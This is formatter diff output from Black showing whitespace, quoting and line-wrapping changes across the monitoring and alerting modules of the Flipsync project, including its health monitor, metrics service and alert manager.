         if JINJA2_AVAILABLE:
             try:
                 self.template_env = Environment(
-                    loader=PackageLoader("fs_agt_clean.core.monitoring.alerts", "templates"),
+                    loader=PackageLoader(
+                        "fs_agt_clean.core.monitoring.alerts", "templates"
+                    ),
                     autoescape=select_autoescape(["html", "xml"]),
                 )
             except Exception as e:
                 logger.warning(f"Could not initialize template environment: {e}")
                 self.template_env = None
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/email_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/__init__.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/__init__.py	2025-06-19 04:03:54.555545+00:00
@@ -1,2 +1 @@
 """metrics module."""
-
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/sms_service.py	2025-06-16 06:50:35.513863+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/sms_service.py	2025-06-19 04:03:54.593940+00:00
@@ -7,10 +7,11 @@
 
 try:
     from twilio.base.exceptions import TwilioRestException
     from twilio.rest import Client
     from twilio.rest.api.v2010.account.message import MessageInstance
+
     TWILIO_AVAILABLE = True
 except ImportError:
     TWILIO_AVAILABLE = False
     TwilioRestException = Exception
     Client = None
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/sms_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/service.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/service.py	2025-06-19 04:03:55.024862+00:00
@@ -21,19 +21,19 @@
 
 
 class MetricsService:
     """
     Service for recording and retrieving metrics.
-    
+
     This service provides a high-level API for metrics operations,
     abstracting the underlying metrics collector implementation.
     """
 
     def __init__(self, service_name: str = "default", **kwargs):
         """
         Initialize the metrics service.
-        
+
         Args:
             service_name: Name of the service using metrics
             **kwargs: Additional arguments passed to MetricsCollector
         """
         self.service_name = service_name
@@ -61,11 +61,11 @@
         labels: Optional[Dict[str, str]] = None,
         category: MetricCategory = MetricCategory.SYSTEM,
     ) -> None:
         """
         Record a gauge metric.
-        
+
         Args:
             name: Metric name
             value: Metric value
             labels: Optional metric labels
             category: Metric category
@@ -85,11 +85,11 @@
         labels: Optional[Dict[str, str]] = None,
         category: MetricCategory = MetricCategory.SYSTEM,
     ) -> None:
         """
         Record a counter metric.
-        
+
         Args:
             name: Metric name
             value: Increment value (default: 1.0)
             labels: Optional metric labels
             category: Metric category
@@ -108,11 +108,11 @@
         labels: Optional[Dict[str, str]] = None,
         category: MetricCategory = MetricCategory.PERFORMANCE,
     ) -> None:
         """
         Record a histogram metric.
-        
+
         Args:
             name: Metric name
             value: Observed value
             labels: Optional metric labels
             category: Metric category
@@ -130,11 +130,11 @@
         latency: float,
         labels: Optional[Dict[str, str]] = None,
     ) -> None:
         """
         Record operation latency.
-        
+
         Args:
             operation: Operation name
             latency: Latency in seconds
             labels: Optional operation labels
         """
@@ -150,11 +150,11 @@
         error_message: str,
         labels: Optional[Dict[str, str]] = None,
     ) -> None:
         """
         Record an error occurrence.
-        
+
         Args:
             source: Error source
             error_message: Error message
             labels: Optional error labels
         """
@@ -169,11 +169,11 @@
         operation: str,
         labels: Optional[Dict[str, str]] = None,
     ) -> None:
         """
         Record a successful operation.
-        
+
         Args:
             operation: Operation name
             labels: Optional operation labels
         """
         await self.collector.record_success(
@@ -189,18 +189,18 @@
         labels: Optional[Dict[str, str]] = None,
         categories: Optional[List[MetricCategory]] = None,
     ) -> List[MetricDataPoint]:
         """
         Get metrics with optional filtering.
-        
+
         Args:
             names: Optional list of metric names to filter
             start_time: Optional start time for filtering
             end_time: Optional end time for filtering
             labels: Optional labels to filter by
             categories: Optional categories to filter by
-            
+
         Returns:
             List of matching metrics
         """
         return await self.collector.get_metrics(
             names=names,
@@ -216,16 +216,16 @@
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
     ) -> Dict[str, Any]:
         """
         Get summary statistics for a metric.
-        
+
         Args:
             name: Metric name
             start_time: Optional start time for filtering
             end_time: Optional end time for filtering
-            
+
         Returns:
             Summary statistics dictionary
         """
         return await self.collector.get_metric_summary(
             name=name,
@@ -234,11 +234,11 @@
         )
 
     def get_service_info(self) -> Dict[str, Any]:
         """
         Get information about the metrics service.
-        
+
         Returns:
             Service information dictionary
         """
         return {
             "service_name": self.service_name,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/metrics/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/agent_interaction/agent_interaction_logger.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/agent_interaction/agent_interaction_logger.py	2025-06-19 04:03:55.041671+00:00
@@ -144,11 +144,13 @@
 
             # Set up logger
             self.logger = get_logger("agent_interaction")
 
             # Set up storage
-            self.storage_path = Path(storage_path) if storage_path else Path("logs/agent_interactions")
+            self.storage_path = (
+                Path(storage_path) if storage_path else Path("logs/agent_interactions")
+            )
             self.storage_path.mkdir(parents=True, exist_ok=True)
 
             # Store configuration
             self.enable_metrics = enable_metrics
             self.enable_visualization = enable_visualization
@@ -190,11 +192,13 @@
             Message ID
         """
         # Generate IDs if not provided
         message_id = str(uuid.uuid4())
         interaction_id = interaction_id or str(uuid.uuid4())
-        correlation_id = correlation_id or get_correlation_id("default") or str(uuid.uuid4())
+        correlation_id = (
+            correlation_id or get_correlation_id("default") or str(uuid.uuid4())
+        )
 
         # Set correlation ID for context
         set_correlation_id("default", correlation_id)
         self._active_correlations.add(correlation_id)
 
@@ -353,11 +357,13 @@
         interaction_data = interaction.to_dict()
         interaction_data["messages"] = messages
 
         return interaction_data
 
-    async def get_interactions_by_correlation(self, correlation_id: str) -> List[Dict[str, Any]]:
+    async def get_interactions_by_correlation(
+        self, correlation_id: str
+    ) -> List[Dict[str, Any]]:
         """
         Get all interactions for a correlation ID.
 
         Args:
             correlation_id: Correlation ID
@@ -426,16 +432,18 @@
 
         # Collect edges (messages)
         edges = []
         for message in self._messages.values():
             if message.timestamp >= cutoff_time:
-                edges.append({
-                    "source": message.sender_id,
-                    "target": message.receiver_id,
-                    "type": message.message_type.name,
-                    "id": message.message_id,
-                })
+                edges.append(
+                    {
+                        "source": message.sender_id,
+                        "target": message.receiver_id,
+                        "type": message.message_type.name,
+                        "id": message.message_id,
+                    }
+                )
 
         # Create visualization data
         visualization_data = {
             "nodes": [{"id": agent_id, "label": agent_id} for agent_id in agents],
             "edges": edges,
@@ -451,16 +459,23 @@
         elif format == "html":
             # Simple HTML visualization
             output = self._generate_html_visualization(visualization_data)
         elif format == "cytoscape":
             # Cytoscape.js format
-            output = json.dumps({
-                "elements": {
-                    "nodes": [{"data": node} for node in visualization_data["nodes"]],
-                    "edges": [{"data": edge} for edge in visualization_data["edges"]],
+            output = json.dumps(
+                {
+                    "elements": {
+                        "nodes": [
+                            {"data": node} for node in visualization_data["nodes"]
+                        ],
+                        "edges": [
+                            {"data": edge} for edge in visualization_data["edges"]
+                        ],
+                    },
                 },
-            }, indent=2)
+                indent=2,
+            )
         else:
             output = json.dumps(visualization_data, indent=2)
 
         # Save to file if destination provided
         if destination:
@@ -511,11 +526,13 @@
 
         # Clean up old correlations
         old_correlations = set()
         for correlation_id in self._active_correlations:
             # Check if any interactions still use this correlation
-            if not any(i.correlation_id == correlation_id for i in self._interactions.values()):
+            if not any(
+                i.correlation_id == correlation_id for i in self._interactions.values()
+            ):
                 old_correlations.add(correlation_id)
 
         self._active_correlations -= old_correlations
 
         self.logger.info(
@@ -633,11 +650,11 @@
         return html
 
     async def close(self) -> None:
         """Close the logger and clean up resources."""
         self._is_running = False
-        if hasattr(self, '_cleanup_task') and self._cleanup_task:
+        if hasattr(self, "_cleanup_task") and self._cleanup_task:
             self._cleanup_task.cancel()
             try:
                 await self._cleanup_task
             except asyncio.CancelledError:
                 pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/agent_interaction/agent_interaction_logger.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/health_monitor.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/health_monitor.py	2025-06-19 04:03:55.062397+00:00
@@ -21,20 +21,22 @@
 
 
 @dataclass
 class HealthStatus:
     """Health status data structure."""
+
     component: str
     status: str  # "healthy", "warning", "critical", "unknown"
     message: str
     timestamp: datetime
     metrics: Dict[str, Any]
 
 
 @dataclass
 class SystemMetrics:
     """System metrics data structure."""
+
     cpu_percent: float
     memory_percent: float
     memory_total: int
     memory_used: int
     disk_percent: float
@@ -45,268 +47,268 @@
     timestamp: datetime
 
 
 class RealHealthMonitor:
     """Real-time health monitoring service."""
-    
+
     def __init__(self, database: Optional[Database] = None):
         """Initialize the health monitor.
-        
+
         Args:
             database: Optional database instance for health checks
         """
         self.logger = logging.getLogger(__name__)
         self.database = database
         self._monitoring = False
         self._health_status: Dict[str, HealthStatus] = {}
         self._last_metrics: Optional[SystemMetrics] = None
-        
+
     async def start_monitoring(self, interval: int = 30) -> None:
         """Start continuous health monitoring.
-        
+
         Args:
             interval: Monitoring interval in seconds
         """
         if self._monitoring:
             self.logger.warning("Health monitoring is already running")
             return
-            
+
         self._monitoring = True
         self.logger.info(f"Starting health monitoring with {interval}s interval")
-        
+
         while self._monitoring:
             try:
                 await self._collect_health_data()
                 await asyncio.sleep(interval)
             except Exception as e:
                 self.logger.error(f"Error in health monitoring loop: {e}")
                 await asyncio.sleep(interval)
-    
+
     async def stop_monitoring(self) -> None:
         """Stop health monitoring."""
         self._monitoring = False
         self.logger.info("Health monitoring stopped")
-    
+
     async def _collect_health_data(self) -> None:
         """Collect comprehensive health data."""
         timestamp = datetime.now(timezone.utc)
-        
+
         # Collect system metrics
         system_metrics = await self._collect_system_metrics()
         self._last_metrics = system_metrics
-        
+
         # Check system health
         await self._check_system_health(system_metrics)
-        
+
         # Check database health
         if self.database:
             await self._check_database_health()
-        
+
         # Check service health
         await self._check_service_health()
-        
+
         self.logger.debug(f"Health data collected at {timestamp}")
-    
+
     async def _collect_system_metrics(self) -> SystemMetrics:
         """Collect system resource metrics."""
         try:
             # CPU metrics
             cpu_percent = psutil.cpu_percent(interval=1)
-            
+
             # Memory metrics
             memory = psutil.virtual_memory()
-            
+
             # Disk metrics
-            disk = psutil.disk_usage('/')
-            
+            disk = psutil.disk_usage("/")
+
             # Network metrics
             network = psutil.net_io_counters()
-            
+
             return SystemMetrics(
                 cpu_percent=cpu_percent,
                 memory_percent=memory.percent,
                 memory_total=memory.total,
                 memory_used=memory.used,
                 disk_percent=disk.percent,
                 disk_total=disk.total,
                 disk_used=disk.used,
                 network_sent=network.bytes_sent,
                 network_received=network.bytes_recv,
-                timestamp=datetime.now(timezone.utc)
+                timestamp=datetime.now(timezone.utc),
             )
         except Exception as e:
             self.logger.error(f"Error collecting system metrics: {e}")
             raise
-    
+
     async def _check_system_health(self, metrics: SystemMetrics) -> None:
         """Check system health based on metrics."""
         timestamp = datetime.now(timezone.utc)
-        
+
         # CPU health check
         if metrics.cpu_percent > 90:
             status = "critical"
             message = f"CPU usage critical: {metrics.cpu_percent:.1f}%"
         elif metrics.cpu_percent > 75:
             status = "warning"
             message = f"CPU usage high: {metrics.cpu_percent:.1f}%"
         else:
             status = "healthy"
             message = f"CPU usage normal: {metrics.cpu_percent:.1f}%"
-        
+
         self._health_status["cpu"] = HealthStatus(
             component="cpu",
             status=status,
             message=message,
             timestamp=timestamp,
-            metrics={"cpu_percent": metrics.cpu_percent}
+            metrics={"cpu_percent": metrics.cpu_percent},
         )
-        
+
         # Memory health check
         if metrics.memory_percent > 90:
             status = "critical"
             message = f"Memory usage critical: {metrics.memory_percent:.1f}%"
         elif metrics.memory_percent > 80:
             status = "warning"
             message = f"Memory usage high: {metrics.memory_percent:.1f}%"
         else:
             status = "healthy"
             message = f"Memory usage normal: {metrics.memory_percent:.1f}%"
-        
+
         self._health_status["memory"] = HealthStatus(
             component="memory",
             status=status,
             message=message,
             timestamp=timestamp,
             metrics={
                 "memory_percent": metrics.memory_percent,
                 "memory_total": metrics.memory_total,
-                "memory_used": metrics.memory_used
-            }
+                "memory_used": metrics.memory_used,
+            },
         )
-        
+
         # Disk health check
         if metrics.disk_percent > 95:
             status = "critical"
             message = f"Disk usage critical: {metrics.disk_percent:.1f}%"
         elif metrics.disk_percent > 85:
             status = "warning"
             message = f"Disk usage high: {metrics.disk_percent:.1f}%"
         else:
             status = "healthy"
             message = f"Disk usage normal: {metrics.disk_percent:.1f}%"
-        
+
         self._health_status["disk"] = HealthStatus(
             component="disk",
             status=status,
             message=message,
             timestamp=timestamp,
             metrics={
                 "disk_percent": metrics.disk_percent,
                 "disk_total": metrics.disk_total,
-                "disk_used": metrics.disk_used
-            }
+                "disk_used": metrics.disk_used,
+            },
         )
-    
+
     async def _check_database_health(self) -> None:
         """Check database connectivity and health."""
         timestamp = datetime.now(timezone.utc)
-        
+
         try:
             # Test database connection
             start_time = time.time()
             async with self.database.get_session_context() as session:
                 # Simple query to test connectivity
                 await session.execute("SELECT 1")
-            
+
             response_time = (time.time() - start_time) * 1000  # Convert to ms
-            
+
             if response_time > 1000:  # 1 second
                 status = "warning"
                 message = f"Database response slow: {response_time:.1f}ms"
             else:
                 status = "healthy"
                 message = f"Database responsive: {response_time:.1f}ms"
-            
+
             self._health_status["database"] = HealthStatus(
                 component="database",
                 status=status,
                 message=message,
                 timestamp=timestamp,
-                metrics={"response_time_ms": response_time}
+                metrics={"response_time_ms": response_time},
             )
-            
+
         except Exception as e:
             self._health_status["database"] = HealthStatus(
                 component="database",
                 status="critical",
                 message=f"Database connection failed: {str(e)}",
                 timestamp=timestamp,
-                metrics={}
+                metrics={},
             )
-    
+
     async def _check_service_health(self) -> None:
         """Check health of various services."""
         timestamp = datetime.now(timezone.utc)
-        
+
         # For now, mark API service as healthy since we're running
         self._health_status["api"] = HealthStatus(
             component="api",
             status="healthy",
             message="API service operational",
             timestamp=timestamp,
-            metrics={}
+            metrics={},
         )
-    
+
     def get_health_status(self) -> Dict[str, Dict[str, Any]]:
         """Get current health status of all components.
-        
+
         Returns:
             Dictionary containing health status for all monitored components
         """
         return {
             component: {
                 "status": health.status,
                 "message": health.message,
                 "timestamp": health.timestamp.isoformat(),
-                "metrics": health.metrics
+                "metrics": health.metrics,
             }
             for component, health in self._health_status.items()
         }
-    
+
     def get_system_metrics(self) -> Optional[Dict[str, Any]]:
         """Get latest system metrics.
-        
+
         Returns:
             Dictionary containing latest system metrics or None if not available
         """
         if not self._last_metrics:
             return None
-        
+
         return {
             "cpu_percent": self._last_metrics.cpu_percent,
             "memory_percent": self._last_metrics.memory_percent,
             "memory_total": self._last_metrics.memory_total,
             "memory_used": self._last_metrics.memory_used,
             "disk_percent": self._last_metrics.disk_percent,
             "disk_total": self._last_metrics.disk_total,
             "disk_used": self._last_metrics.disk_used,
             "network_sent": self._last_metrics.network_sent,
             "network_received": self._last_metrics.network_received,
-            "timestamp": self._last_metrics.timestamp.isoformat()
+            "timestamp": self._last_metrics.timestamp.isoformat(),
         }
-    
+
     def get_overall_health(self) -> str:
         """Get overall system health status.
-        
+
         Returns:
             Overall health status: "healthy", "warning", "critical", or "unknown"
         """
         if not self._health_status:
             return "unknown"
-        
+
         statuses = [health.status for health in self._health_status.values()]
-        
+
         if "critical" in statuses:
             return "critical"
         elif "warning" in statuses:
             return "warning"
         elif all(status == "healthy" for status in statuses):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/health_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/manager.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/manager.py	2025-06-19 04:03:55.341149+00:00
@@ -12,11 +12,14 @@
     AlertSeverity,
     AlertType,
     MetricType,
 )
 from fs_agt_clean.core.monitoring.alerts.notification_service import NotificationService
-from fs_agt_clean.core.monitoring.alerts.persistence import AlertStorage, SQLiteAlertStorage
+from fs_agt_clean.core.monitoring.alerts.persistence import (
+    AlertStorage,
+    SQLiteAlertStorage,
+)
 from fs_agt_clean.core.monitoring.alerts.validation import (
     AlertValidationError,
     validate_alert,
 )
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/persistence.py	2025-06-16 07:03:34.129597+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/persistence.py	2025-06-19 04:03:55.343666+00:00
@@ -7,17 +7,19 @@
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Protocol, Union
 
 try:
     import aiofiles
+
     AIOFILES_AVAILABLE = True
 except ImportError:
     AIOFILES_AVAILABLE = False
     aiofiles = None
 
 try:
     import aiosqlite
+
     AIOSQLITE_AVAILABLE = True
 except ImportError:
     AIOSQLITE_AVAILABLE = False
     aiosqlite = None
 
@@ -213,11 +215,13 @@
             config: Optional configuration dictionary.
         """
         super().__init__(config)
 
         if not AIOFILES_AVAILABLE:
-            raise ImportError("aiofiles is required for FileAlertStorage but not available")
+            raise ImportError(
+                "aiofiles is required for FileAlertStorage but not available"
+            )
 
         self.storage_path = Path(storage_path)
         self.max_file_size = max_file_size
         self.rotation_count = rotation_count
         self._ensure_storage_path()
@@ -452,11 +456,13 @@
             config: Optional configuration dictionary
         """
         super().__init__(config)
 
         if not AIOSQLITE_AVAILABLE:
-            raise ImportError("aiosqlite is required for SQLiteAlertStorage but not available")
+            raise ImportError(
+                "aiosqlite is required for SQLiteAlertStorage but not available"
+            )
 
         self.db_path = Path(db_path)
         self._db_initialized = False
 
     async def _ensure_database(self) -> None:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/persistence.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/service.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/service.py	2025-06-19 04:03:55.432308+00:00
@@ -5,11 +5,15 @@
 
 import asyncio
 import logging
 from typing import Any, Dict, List, Optional, Set, Union
 
-from fs_agt_clean.core.monitoring.alerts.models import Alert, AlertChannel, AlertSeverity
+from fs_agt_clean.core.monitoring.alerts.models import (
+    Alert,
+    AlertChannel,
+    AlertSeverity,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class NotificationService:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/alert_manager.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/alert_manager.py	2025-06-19 04:03:55.542921+00:00
@@ -83,11 +83,11 @@
         alert_id: Optional[str] = None,
         correlation_id: Optional[str] = None,
     ):
         """
         Initialize an alert.
-        
+
         Args:
             title: Alert title
             message: Alert message
             level: Alert level
             category: Alert category
@@ -113,11 +113,11 @@
         self.acknowledged_by = None
 
     def to_dict(self) -> Dict[str, Any]:
         """
         Convert to dictionary.
-        
+
         Returns:
             Dictionary representation
         """
         return {
             "alert_id": self.alert_id,
@@ -129,22 +129,24 @@
             "details": self.details,
             "labels": self.labels,
             "timestamp": self.timestamp.isoformat(),
             "correlation_id": self.correlation_id,
             "acknowledged": self.acknowledged,
-            "acknowledged_time": self.acknowledged_time.isoformat() if self.acknowledged_time else None,
+            "acknowledged_time": (
+                self.acknowledged_time.isoformat() if self.acknowledged_time else None
+            ),
             "acknowledged_by": self.acknowledged_by,
         }
 
     @classmethod
     def from_dict(cls, data: Dict[str, Any]) -> "Alert":
         """
         Create from dictionary.
-        
+
         Args:
             data: Dictionary representation
-            
+
         Returns:
             Alert instance
         """
         alert = cls(
             title=data["title"],
@@ -165,22 +167,22 @@
         return alert
 
     def acknowledge(self, user: Optional[str] = None) -> None:
         """
         Acknowledge the alert.
-        
+
         Args:
             user: User who acknowledged the alert
         """
         self.acknowledged = True
         self.acknowledged_time = datetime.now(timezone.utc)
         self.acknowledged_by = user
 
     def get_fingerprint(self) -> str:
         """
         Get a fingerprint for deduplication.
-        
+
         Returns:
             Alert fingerprint
         """
         # Create a fingerprint based on title, message, level, and category
         return f"{self.title}:{self.message}:{self.level.value}:{self.category.value}"
@@ -196,11 +198,11 @@
         levels: Optional[Set[AlertLevel]] = None,
         categories: Optional[Set[AlertCategory]] = None,
     ):
         """
         Initialize an alert channel.
-        
+
         Args:
             name: Channel name
             send_func: Function to send alerts
             levels: Optional set of levels to send (None = all)
             categories: Optional set of categories to send (None = all)
@@ -211,14 +213,14 @@
         self.categories = categories
 
     def should_send(self, alert: Alert) -> bool:
         """
         Check if alert should be sent to this channel.
-        
+
         Args:
             alert: Alert to check
-            
+
         Returns:
             True if alert should be sent, False otherwise
         """
         if self.levels and alert.level not in self.levels:
             return False
@@ -227,29 +229,29 @@
         return True
 
     def send(self, alert: Alert) -> None:
         """
         Send alert to this channel.
-        
+
         Args:
             alert: Alert to send
         """
         if self.should_send(alert):
             self.send_func(alert)
 
 
 class AlertManager:
     """
     Manages alerts with mobile and vision awareness.
-    
+
     This class provides a centralized alert management system that supports:
     - Different alert levels and categories
     - Alert routing to different channels
     - Alert deduplication and rate limiting
     - Mobile-specific optimizations
     - Integration with notification systems
-    
+
     It serves as the foundation for specialized alert management.
     """
 
     _instance = None
     _lock = threading.RLock()
@@ -272,11 +274,11 @@
         storage_path: Optional[Union[str, Path]] = None,
         mobile_optimized: bool = False,
     ):
         """
         Initialize alert manager.
-        
+
         Args:
             service_name: Name of the service
             max_history_size: Maximum number of alerts to keep in memory
             dedup_window: Window for deduplication in seconds
             rate_limit_window: Window for rate limiting in seconds
@@ -295,20 +297,28 @@
             self.rate_limit_window = rate_limit_window
             self.max_alerts_per_window = max_alerts_per_window
             self.mobile_optimized = mobile_optimized
 
             # Set up storage path
-            self.storage_path = Path(storage_path) if storage_path else Path(DEFAULT_STORAGE_PATH)
+            self.storage_path = (
+                Path(storage_path) if storage_path else Path(DEFAULT_STORAGE_PATH)
+            )
             os.makedirs(self.storage_path, exist_ok=True)
 
             # Initialize alert storage
             self.active_alerts: Dict[str, Alert] = {}  # alert_id -> alert
             self.alert_history: List[Alert] = []  # All alerts
-            self.alert_fingerprints: Dict[str, datetime] = {}  # fingerprint -> last time
-            self.alert_counts: Dict[str, int] = {}  # fingerprint -> count in rate limit window
+            self.alert_fingerprints: Dict[str, datetime] = (
+                {}
+            )  # fingerprint -> last time
+            self.alert_counts: Dict[str, int] = (
+                {}
+            )  # fingerprint -> count in rate limit window
             self.channels: List[AlertChannel] = []  # Alert channels
-            self.thresholds: Dict[str, Tuple[float, float]] = {}  # metric_name -> (warning, critical)
+            self.thresholds: Dict[str, Tuple[float, float]] = (
+                {}
+            )  # metric_name -> (warning, critical)
 
             # Initialize async lock
             self._async_lock = asyncio.Lock()
 
             # Add default channels
@@ -331,52 +341,56 @@
         )
 
     def _send_to_console(self, alert: Alert) -> None:
         """
         Send alert to console.
-        
+
         Args:
             alert: Alert to send
         """
         level_colors = {
             AlertLevel.INFO: "\033[94m",  # Blue
             AlertLevel.WARNING: "\033[93m",  # Yellow
             AlertLevel.ERROR: "\033[91m",  # Red
             AlertLevel.CRITICAL: "\033[91;1m",  # Bold Red
         }
         reset_color = "\033[0m"
-        
+
         color = level_colors.get(alert.level, "")
-        print(f"{color}[{alert.level.value.upper()}] {alert.title}: {alert.message}{reset_color}")
+        print(
+            f"{color}[{alert.level.value.upper()}] {alert.title}: {alert.message}{reset_color}"
+        )
 
     def _send_to_log(self, alert: Alert) -> None:
         """
         Send alert to log.
-        
+
         Args:
             alert: Alert to send
         """
         log_levels = {
             AlertLevel.INFO: logging.INFO,
             AlertLevel.WARNING: logging.WARNING,
             AlertLevel.ERROR: logging.ERROR,
             AlertLevel.CRITICAL: logging.CRITICAL,
         }
-        
+
         log_level = log_levels.get(alert.level, logging.INFO)
-        self.logger.log(log_level, f"[{alert.category.value}] {alert.title}: {alert.message}")
+        self.logger.log(
+            log_level, f"[{alert.category.value}] {alert.title}: {alert.message}"
+        )
 
     def add_channel(
         self,
         name: str,
         send_func: Callable[[Alert], None],
         levels: Optional[Set[AlertLevel]] = None,
         categories: Optional[Set[AlertCategory]] = None,
     ) -> None:
         """
         Add an alert channel.
-        
+
         Args:
             name: Channel name
             send_func: Function to send alerts
             levels: Optional set of levels to send (None = all)
             categories: Optional set of categories to send (None = all)
@@ -392,14 +406,14 @@
             self.logger.info(f"Added alert channel: {name}")
 
     def remove_channel(self, name: str) -> bool:
         """
         Remove an alert channel.
-        
+
         Args:
             name: Channel name
-            
+
         Returns:
             True if channel was removed, False otherwise
         """
         with self._lock:
             for i, channel in enumerate(self.channels):
@@ -412,11 +426,11 @@
     async def set_threshold(
         self, metric_name: str, warning_threshold: float, critical_threshold: float
     ) -> None:
         """
         Set thresholds for a metric.
-        
+
         Args:
             metric_name: Metric name
             warning_threshold: Warning threshold
             critical_threshold: Critical threshold
         """
@@ -427,14 +441,14 @@
             )
 
     async def clear_threshold(self, metric_name: str) -> bool:
         """
         Clear thresholds for a metric.
-        
+
         Args:
             metric_name: Metric name
-            
+
         Returns:
             True if thresholds were cleared, False otherwise
         """
         async with self._async_lock:
             if metric_name in self.thresholds:
@@ -444,19 +458,19 @@
             return False
 
     async def process_metric(self, metric_name: str, value: float) -> None:
         """
         Process a metric and generate alerts if needed.
-        
+
         Args:
             metric_name: Metric name
             value: Metric value
         """
         async with self._async_lock:
             if metric_name in self.thresholds:
                 warning_threshold, critical_threshold = self.thresholds[metric_name]
-                
+
                 if value >= critical_threshold:
                     await self.create_alert(
                         title=f"{metric_name} exceeded critical threshold",
                         message=f"{metric_name} value {value} exceeded critical threshold {critical_threshold}",
                         level=AlertLevel.CRITICAL,
@@ -495,21 +509,21 @@
         labels: Optional[Dict[str, str]] = None,
         correlation_id: Optional[str] = None,
     ) -> Optional[Alert]:
         """
         Create and process an alert.
-        
+
         Args:
             title: Alert title
             message: Alert message
             level: Alert level
             category: Alert category
             source: Alert source
             details: Optional alert details
             labels: Optional alert labels
             correlation_id: Optional correlation ID for tracking
-            
+
         Returns:
             Created alert if processed, None if deduplicated or rate limited
         """
         # Create alert
         alert = Alert(
@@ -520,120 +534,122 @@
             source=source,
             details=details,
             labels=labels,
             correlation_id=correlation_id,
         )
-        
+
         # Process alert
         return await self.process_alert(alert)
 
     async def process_alert(self, alert: Alert) -> Optional[Alert]:
         """
         Process an alert.
-        
+
         Args:
             alert: Alert to process
-            
+
         Returns:
             Processed alert if not deduplicated or rate limited, None otherwise
         """
         async with self._async_lock:
             # Check for deduplication
             if await self._is_duplicate(alert):
                 self.logger.debug(f"Deduplicated alert: {alert.title}")
                 return None
-                
+
             # Check for rate limiting
             if not await self._check_rate_limit(alert):
                 self.logger.debug(f"Rate limited alert: {alert.title}")
                 return None
-                
+
             # Store alert
             self.active_alerts[alert.alert_id] = alert
             self.alert_history.append(alert)
-            
+
             # Trim history if needed
             if len(self.alert_history) > self.max_history_size:
-                self.alert_history = self.alert_history[-self.max_history_size:]
-                
+                self.alert_history = self.alert_history[-self.max_history_size :]
+
             # Send to channels
             for channel in self.channels:
                 try:
                     channel.send(alert)
                 except Exception as e:
-                    self.logger.error(f"Error sending alert to channel {channel.name}: {e}")
-                    
+                    self.logger.error(
+                        f"Error sending alert to channel {channel.name}: {e}"
+                    )
+
             # Store alert
             await self._store_alert(alert)
-            
+
             return alert
 
     async def _is_duplicate(self, alert: Alert) -> bool:
         """
         Check if alert is a duplicate.
-        
+
         Args:
             alert: Alert to check
-            
+
         Returns:
             True if alert is a duplicate, False otherwise
         """
         fingerprint = alert.get_fingerprint()
         now = datetime.now(timezone.utc)
-        
+
         if fingerprint in self.alert_fingerprints:
             last_time = self.alert_fingerprints[fingerprint]
             if now - last_time < timedelta(seconds=self.dedup_window):
                 return True
-                
+
         self.alert_fingerprints[fingerprint] = now
         return False
 
     async def _check_rate_limit(self, alert: Alert) -> bool:
         """
         Check if alert is rate limited.
-        
+
         Args:
             alert: Alert to check
-            
+
         Returns:
             True if alert is not rate limited, False otherwise
         """
         fingerprint = alert.get_fingerprint()
         now = datetime.now(timezone.utc)
-        
+
         # Clean up old fingerprints
         for fp, last_time in list(self.alert_fingerprints.items()):
             if now - last_time > timedelta(seconds=self.rate_limit_window):
                 del self.alert_fingerprints[fp]
                 if fp in self.alert_counts:
                     del self.alert_counts[fp]
-                    
+
         # Check rate limit
         count = self.alert_counts.get(fingerprint, 0)
         if count >= self.max_alerts_per_window:
             return False
-            
+
         # Increment count
         self.alert_counts[fingerprint] = count + 1
         return True
 
     async def _store_alert(self, alert: Alert) -> None:
         """
         Store alert to disk.
-        
+
         Args:
             alert: Alert to store
         """
         if self.mobile_optimized:
             # In mobile mode, we batch alerts for storage
             return
-            
+
         # Store alert
         filename = f"{self.service_name}_{alert.timestamp.strftime('%Y%m%d')}.json"
         filepath = self.storage_path / filename
-        
+
         # Append to file
         with open(filepath, "a") as f:
             f.write(json.dumps(alert.to_dict()) + "\n")
 
     async def get_active_alerts(
@@ -644,24 +660,24 @@
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
     ) -> List[Alert]:
         """
         Get active alerts with optional filtering.
-        
+
         Args:
             level: Optional level filter
             category: Optional category filter
             source: Optional source filter
             start_time: Optional start time filter
